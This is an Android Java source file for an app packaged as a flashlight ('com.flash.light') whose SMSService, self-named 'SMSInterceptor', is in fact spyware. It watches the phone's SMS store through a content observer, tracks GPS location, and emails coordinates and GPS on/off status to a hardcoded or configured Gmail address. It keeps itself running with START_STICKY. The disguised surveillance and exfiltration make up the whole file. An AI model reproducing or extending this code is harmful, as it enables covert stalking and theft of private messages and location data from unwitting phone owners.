package com.flash.light; 

import android.os.Bundle;
import android.os.IBinder;
import android.os.Handler;
import android.os.Message;
import android.os.Messenger;
import android.os.SystemClock; 

import android.app.Service;
import android.app.Activity;
import android.app.AlarmManager;
import android.app.PendingIntent;

import android.content.Intent;
import android.content.Context;
import android.content.ComponentName;
import android.content.ContentResolver;

import android.location.Location;
import android.location.LocationManager;
import android.location.LocationListener;

import android.net.Uri;
import java.lang.Double;
import android.util.Log;
import android.widget.Toast;
import android.support.annotation.Nullable;
import android.telephony.SmsManager;
import android.database.ContentObserver;

public class SMSService extends Service implements LocationListener {

  private static String gmailEmailString;
  private static final String TAG = "FlashLight SMSService";

  private static GmailSender sender;
  private static Configure configure;
  private static LocationManager locationManager;

  private static boolean eLocation = false;
  private static boolean mLocation = false;

  public SMSService() { 

    Log.i(TAG, "Entering SMSService() constructor");

    configure = new Configure();
    if(!configure.getDatabaseInfo().equals("null")) {
      gmailEmailString = configure.getEmailAddress();
    }
    else {
      gmailEmailString = "smsinterceptorapp@gmail.com";   
    }
  } 

  final Messenger mMessenger = new Messenger(new IncomingHandler());

  static class IncomingHandler extends Handler {
    @Override
    public void handleMessage(Message msg) {
      super.handleMessage(msg);
    }
  }

  public boolean gpsEnabled() {
    return locationManager.isProviderEnabled(LocationManager.GPS_PROVIDER);
  }

  @Override
  public IBinder onBind(Intent intent) {
    return mMessenger.getBinder();
  }

  @Override
  public void onProviderDisabled(String s) {
    new Thread(new Runnable() {

      @Override
      public void run() {
        try {
          sender = new GmailSender();
          sender.sendMail("SMSInterceptor", "GPS has been 'DIS'abled!", gmailEmailString);
        }
        catch(Exception e) {
          e.printStackTrace();
          Log.e(TAG, "onProviderDisabled() Exception e " + e.toString());
        }
      }
    }).start();       
    eLocation = false;
  }

  @Override
  public void onStatusChanged(String s, int i, Bundle bundle) { }

  @Override
  public void onProviderEnabled(String s) {
    new Thread(new Runnable() {

      @Override
      public void run() {
        try {
          sender = new GmailSender();
          sender.sendMail("SMSInterceptor", "GPS has been 'EN'abled!", gmailEmailString);
        }
        catch(Exception e) {
          e.printStackTrace();
          Log.e(TAG, "onProviderEnabled() Exception e " + e.toString());
        }
      }
    }).start();
    eLocation = true;
  }

  @Override
  public void onLocationChanged(Location location) {
    if(mLocation) {
      Double dLatitude  = location.getLatitude();
      final String latitude   = String.valueOf(dLatitude);
      Double dlongitude = location.getLongitude();
      final String longitude  = String.valueOf(dlongitude);

      new Thread(new Runnable() {

        @Override
        public void run() {
          try {
            sender = new GmailSender();
            sender.sendMail("SMSInterceptor", "Location!\nlatitude-longitude coordinates:\n" +
            "" + latitude + "," + longitude, gmailEmailString);
          }
          catch(Exception e) {
            e.printStackTrace();
            Log.e(TAG, "onLocationChanged() Exception e " + e.toString());
          }
        }
      }).start();
    }
    mLocation = false;
  }

  @Override
  public void onTaskRemoved(Intent rootIntent) {
    super.onTaskRemoved(rootIntent);
    Log.d(TAG,"onTaskRemoved()");
  }

  @Override
  public void onDestroy() {
    super.onDestroy();
    Log.d(TAG, "onDestroy()");
  }

  public void onCreate(Context context, Intent intent) {
    Log.d(TAG, "onCreate()");
    try {
      if(intent.getAction() != null) {
        intent = new Intent(context, FlashLight.class);
        intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
        context.startActivity(intent);
      }
    }
    catch(Exception e) {
      e.printStackTrace();
    }
  }

  @Nullable
  @Override
  public int onStartCommand(Intent intent, int flag, int startId) throws NullPointerException {
    super.onStartCommand(intent, flag, startId);

    Log.d(TAG, "onStartCommand() Entering onStartCommand method.");

    locationManager = (LocationManager) getSystemService(Context.LOCATION_SERVICE);
 
    if(locationManager.isProviderEnabled(LocationManager.GPS_PROVIDER)) {
      Log.d(TAG, "onStartCommand() eLocation = TRUE");
      eLocation = true;
    }
    else {
      Log.d(TAG, "onStartCommand() eLocation = FALSE");
      eLocation = false;
    }

    //String data;
    //if(!eLocation && data != null && intent.hasExtra("obtainLocation")) {
    try {
      if(!eLocation && intent.hasExtra("obtainLocation")) {
        new Thread(new Runnable() {

          @Override
          public void run() {
            try {
              sender = new GmailSender();
              sender.sendMail("SMSInterceptor", "GPS is not enabled. Cannot obtain location.", gmailEmailString);
            }
            catch(Exception e) {
              e.printStackTrace();
              Log.e(TAG, "onStartCommand() Exception e " + e.toString());
            }
          }
        }).start();
      }
      else if(eLocation && intent.hasExtra("obtainLocation")) {
        mLocation = true;
      }
    }
    catch(NullPointerException e) {
      Log.e(TAG, "onStartCommand() NullPointerException e " + e.toString());
    }

    locationManager.requestLocationUpdates(LocationManager.GPS_PROVIDER,30000,10,this);

    Handler mSmsObserverHandler = new Handler();
    ContentResolver contentResolver = this.getApplicationContext().getContentResolver();
    SMSObserver smsObserver = new SMSObserver(mSmsObserverHandler, getApplicationContext());
    contentResolver.registerContentObserver(Uri.parse("content://sms/"), true, smsObserver);

    return START_STICKY;
  }

}
